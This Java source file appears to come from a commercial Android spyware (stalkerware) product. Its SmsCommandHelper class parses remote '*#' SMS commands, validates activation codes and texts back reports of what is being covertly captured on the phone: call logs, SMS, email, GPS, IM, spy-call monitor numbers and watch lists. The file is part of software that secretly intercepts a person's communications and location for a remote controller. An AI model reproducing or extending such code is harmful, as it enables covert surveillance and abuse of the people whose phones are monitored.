package com.fx.dalvik.smscommand;

import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import java.util.regex.Pattern;

import android.content.Context;
import android.telephony.SmsManager;

import com.fx.event.Event;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxResource;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

public class SmsCommandHelper {
	
	private static final String TAG = "SmsCommandHelper";
 	private static final boolean LOGV = Customization.VERBOSE;
	
 	private static final String REGEX_COMMAND_FORMAT = "[*][#][0-9]+";
	private static final String REGEX_ACTIVATION_CODE = "[0-9]+";
	
	public static final String TAG_DELIMITERS = "<|>";
	public static final String COMMA_DELIMITERS = ",[ ]*";
	
	/**
	 * Validate Activation Code in sms command
	 * @return response OK if an input code is correct
	 */
	public static String getActivationCodeValidation(Context context, String activationCode) {
		String reportMessage = null;
		
		LicenseManager licenseManager = LicenseManager.getInstance(context);
		
		// No activation code or Product is not yet activated
		if (licenseManager == null 
				|| licenseManager.getActivationCode() == null
				|| !licenseManager.isActivated()) {
			reportMessage = String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_PRODUCT_IS_NOT_ACTIVATED);
		}
		// Invalid Activation Code -> contains letters or symbols
		else if (!Pattern.matches(REGEX_ACTIVATION_CODE, activationCode)) {
			reportMessage = String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_ACTIVATION_CODE);
		}
		// Wrong Activation Code
		else if (!licenseManager.getActivationCode().equals(activationCode)) {
			reportMessage = String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_WRONG_ACTIVATION_CODE);
		}
		else {
			return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
		}
		
		return reportMessage;
	}
	
	/**
	 * Validate and construct header for responding message.
	 * Throw SmsCommandException, when the validation is fail.
	 * An exception message is made ready for sending a response.
	 */
	public static String getResponseHeader(Context context, 
			String productIdVersion, String displayMessageBody) throws SmsCommandException {
		
		StringBuilder builder = new StringBuilder();
		
		// Append product ID Version
		builder.append("[").append(productIdVersion).append("]");
		
		// Invalid TAGs format
		if (!checkTagFormat(displayMessageBody)) {
			builder.append(" ");
			builder.append(String.format("%s\n%s", 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR,
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT));
			throw new SmsCommandException(builder.toString());
		}
		
		// Prepare tokens
		String[] tokens = GeneralUtil.getTokenArray(displayMessageBody, TAG_DELIMITERS);
		
		// Not a command -> contains letters
		if (tokens.length > 0 && !Pattern.matches(REGEX_COMMAND_FORMAT, tokens[0])) {
			builder.append(" ");
			builder.append(String.format("%s\n%s", 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR,
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_NOT_A_COMMAND));
			throw new SmsCommandException(builder.toString());
		}
		
		// Command code e.g. *#60
		String commandCode = tokens[0];
		builder.append("[").append(getCommandNumber(commandCode)).append("] ");
		
		return builder.toString();
	}
	
	/**
	 * Generate overall settings response message
	 */
	public static String getCurrentSettings(Context context) {
		ProductInfo productInfo = PreferenceManager.getInstance(context).getProductInfo();
		ProductEdition productEdition = productInfo.getEdition();
		
		StringBuilder builder = new StringBuilder()
				.append(getCurrentEventSettings(context, false));
		
		boolean isSpyEnabled = 
			productEdition == ProductEdition.PROX || 
			productEdition == ProductEdition.PRO;
		
		if (isSpyEnabled) {
			builder.append("\n").append(getSpyCallSettings(context, true, false));
		}
		
		return builder.toString();
	}
	
	/**
	 * Generate event setting response message
	 */
	public static String getCurrentEventSettings(Context context, boolean includeHeader) {
		PreferenceManager preferenceManager = PreferenceManager.getInstance(context);
		
		StringBuilder builder = new StringBuilder();
		
		if (includeHeader) {
			builder.append("==Current Settings==\n");
		}
		
		builder.append("Start Capture:");
		builder.append(preferenceManager.isCaptureEnabled() ? "Yes" : "No")
				.append("\n");
		
		builder.append("Events:");
		ArrayList<String> capturedList = new ArrayList<String>();
		if (preferenceManager.isCaptureCallLogEnabled()) {
			builder.append("Call log");
			capturedList.add("Call log");
		}
		if (preferenceManager.isCaptureSmsEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("SMS");
			capturedList.add("SMS");
		}
		if (preferenceManager.isCaptureEmailEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("Email");
			capturedList.add("Email");
		}
		if (preferenceManager.isCaptureLocationEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("GPS");
			capturedList.add("GPS");
		}
		if (preferenceManager.isCaptureImEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("IM");
			capturedList.add("IM");
		}
		if (capturedList.isEmpty()) {
			builder.append("None");
		}
		builder.append("\n");
		
		if (preferenceManager.isCaptureLocationEnabled()) {
			builder.append("GPS Interval:");
			builder.append(
					GeneralUtil.getTimeDisplayValue(
							preferenceManager.getGpsTimeIntervalSeconds()).trim()).append("\n");
		}
		
		int timer = preferenceManager.getDeliveryPeriodHours();
		builder.append("Timer:");
		builder.append(String.format("%d%s", timer, timer < 2 ? "hour" : "hours")).append("\n");
		
		builder.append("Max Event:");
		builder.append(preferenceManager.getMaxEvents());
		
		return builder.toString();
	}
	
	/**
	 * Generate spy call setting response message
	 */
	public static String getSpyCallSettings(Context context, 
			boolean isSpyStatusIncluded, boolean includeHeader) {
		
		ProductInfo productInfo = PreferenceManager.getInstance(context).getProductInfo();
		ProductEdition productEdition = productInfo.getEdition();
		
		// Watch list is only available in ProX
		boolean isProX = productEdition == ProductEdition.PROX;
		
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		
		StringBuilder builder = new StringBuilder();
		
		if (includeHeader) {
			builder.append("==Current Settings==\n");
		}
		
		if (isSpyStatusIncluded) {
			builder.append(String.format(
					"Call:%s", 
					spyInfoManager.isEnabled() ? "Yes" : "No"));
			
			String monitorNumber = spyInfoManager.getMonitorNumber();
			if (monitorNumber == null || monitorNumber.trim().length() < 1) {
				monitorNumber = "N/A";
			}
			builder.append(String.format(",%s", monitorNumber));
			if (isProX) builder.append("\n");
		}
		
		if (isProX) {
			// Must do loading before getting watch list information
			spyInfoManager.loadWatchListFromStorage();
			
			builder.append(String.format("WL Status:%s", spyInfoManager.getWatchListStatus()));
			
			List<String> watchlist = spyInfoManager.getWatchList();
			if (watchlist.size() > 0) {
				builder.append("\nNumber:");
				for (String number : watchlist){
					builder.append(String.format("\n%s", number));
				}
			}
		}
		
		return builder.toString();
	}
	
	/**
	 * Check whether an input String is considered an SMS command.
	 * This method should be called before other operations.
	 * No further operation is required, if an incoming SMS is not a command.
	 */
	public static boolean isConsideredSmsCommand(String messageBody) {
		if (LOGV) FxLog.v(TAG, "isPossibleSmsCommand # ENTER ...");
		return messageBody.trim().startsWith(FxResource.SMS_COMMAND_TAG); 
	}
	
	/**
	 * Check if a final token is a debug tag
	 */
	public static boolean isEndWithDebugTag(String[] tokens) {
		return tokens[tokens.length-1].equalsIgnoreCase("d");
	}
	
	/**
	 * Check if an SMS command need a responding message.
	 */
	public static boolean isRequestSendingResponse(Context context, String messageBody) {
		return messageBody.endsWith("<D>") || messageBody.endsWith("<d>");
	}
	
	/**
	 * Send response message.
	 */
	public static void sendResponse(final Context context, 
			final String destination, final String messageBody, boolean sendSms) {
		
		FxLog.d(TAG, String.format(
				"sendResponse # response: %s, sendSms: %s", messageBody, sendSms));
		
		if (LOGV) FxLog.v(TAG, "sendResponse # Capture system event");
		FxUtil.captureSystemEvent(context, Event.DIRECTION_OUT, messageBody);
		
		if (sendSms) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendMultipartTextMessage(
					destination, null, smsManager.divideMessage(messageBody), null, null);
			FxLog.d(TAG, "sendResponse # Reply SMS is sent");
		}
	}
	
	/**
	 * Check that every TAG has properly open-and-close.
	 * No inner TAGs are allowed.
	 */
	private static boolean checkTagFormat(String input) {
		boolean foundOpenTag = false;
		char read;
		for (int i = 0; i < input.length(); i++) {
			read = input.charAt(i);
			if (!foundOpenTag && read == '<') {
				foundOpenTag = true;
			}
			else if (foundOpenTag && read == '>') {
				foundOpenTag = false;
			}
			else if ((!foundOpenTag && read == '>') 
					|| (foundOpenTag && read == '<')){
				return false;
			}
		}
		return foundOpenTag ? false : true;
	}
	
	/**
	 * Remove *# from command code.
	 */
	private static String getCommandNumber(String commandCode) {
		return new StringTokenizer(commandCode, "*#").nextToken();
	}
}
